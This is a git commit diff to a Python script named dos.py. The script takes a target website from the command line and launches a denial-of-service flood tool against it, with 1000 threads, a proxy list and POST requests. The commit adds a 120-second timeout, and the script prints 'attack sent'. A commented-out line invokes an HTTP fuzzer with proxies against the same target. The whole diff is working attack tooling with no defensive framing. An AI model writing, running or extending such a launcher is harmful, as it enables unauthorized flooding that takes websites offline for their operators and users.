6ff69c3a2d8adeeebde7631420c3b1ffe25d878d
baphomet-disciple <122203558+baphomet-disciple@users.noreply.github.com>
2023-03-04 17:40:14 +0530

    Update dos.py

--- dos.py
+++ dos.py
@@ -8,6 +8,6 @@ if len(sys.argv) < 2:
 website = sys.argv[1]
 print (website)
 #subprocess.Popen(["node", "httpfuzz.js", website, "proxy.txt", "10000", "POST"], stdout=subprocess.PIPE, stder>
-process = subprocess.Popen(["python3", "cc.py", "-url", website, "-m", "cc", "-v", "http", "-t", "1000", "-f", "http.txt", "-b", "1", "-s", "2592000", "post"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+process = subprocess.Popen(["timeout","120s","python3", "cc.py", "-url", website, "-m", "cc", "-v", "http", "-t", "1000", "-f", "http.txt", "-b", "1", "-s", "2592000", "post"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 print("attack sent")
 
